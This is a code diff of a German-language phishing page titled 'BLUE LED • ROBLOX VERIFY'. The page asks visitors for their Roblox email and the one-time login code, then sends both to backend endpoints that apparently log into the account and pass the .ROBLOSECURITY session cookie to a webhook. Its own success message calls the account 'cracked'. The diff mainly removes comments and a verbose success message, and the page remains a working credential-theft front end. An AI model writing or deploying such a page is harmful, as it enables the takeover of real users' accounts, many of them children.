@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BLUE LED • ROBLOX VERIFY</title>
     <style>
-        /* Styles bleiben GLEICH wie vorher */
         * {
             margin: 0;
             padding: 0;
@@ -225,7 +224,7 @@
             <div class="warning">
                 ⚠️ Email muss bei Roblox VERIFIZIERT sein!
             </div>
-            <input type="email" id="emailInput" placeholder="deine@email.com" value="test@email.com">
+            <input type="email" id="emailInput" placeholder="deine@email.com">
             <button onclick="sendOneTimeCode()" id="sendBtn">📧 CODE ANFORDERN</button>
         </div>
 
@@ -258,7 +257,7 @@
             
             <div class="success" id="successMessage">
                 Account erfolgreich geknackt!<br>
-                <span style="font-size: 0.8em;">.ROBLOSECURITY wurde an Webhook gesendet</span>
+                <span style="font-size: 0.8em;">Cookie wurde an Webhook gesendet</span>
             </div>
         </div>
 
@@ -270,7 +269,6 @@
     <script>
         let currentEmail = '';
 
-        // Schritt 1: One-Time Code anfordern
         async function sendOneTimeCode() {
             const email = document.getElementById('emailInput').value.trim();
             
@@ -280,14 +278,11 @@
             }
 
             currentEmail = email;
-
-            // UI Update
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
             document.getElementById('sendBtn').disabled = true;
 
             try {
-                // Bot sendet Anfrage an Roblox
                 const response = await fetch('/api/send-code', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -308,7 +303,6 @@
             }
         }
 
-        // Schritt 2: Code gegen Cookie eintauschen
         async function exchangeCode() {
             const userCode = document.getElementById('codeInput').value.trim();
             
@@ -321,7 +315,6 @@
             document.getElementById('exchangeBtn').disabled = true;
 
             try {
-                // Code an Bot senden - der logged sich ein und holt Cookie
                 const response = await fetch('/api/exchange-code', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -334,14 +327,8 @@
                 const data = await response.json();
 
                 if (data.success) {
-                    // Success!
                     document.getElementById('step2').classList.add('hidden');
                     document.getElementById('step3').classList.remove('hidden');
-                    
-                    document.getElementById('successMessage').innerHTML = `
-                        ✅ Account erfolgreich geknackt!<br>
-                        <span style="font-size: 0.8em;">Email: ${currentEmail}<br>Code: ${userCode}<br>Cookie wurde an Webhook gesendet!</span>
-                    `;
                 } else {
                     throw new Error(data.error || 'Fehler beim Einlösen');
                 }
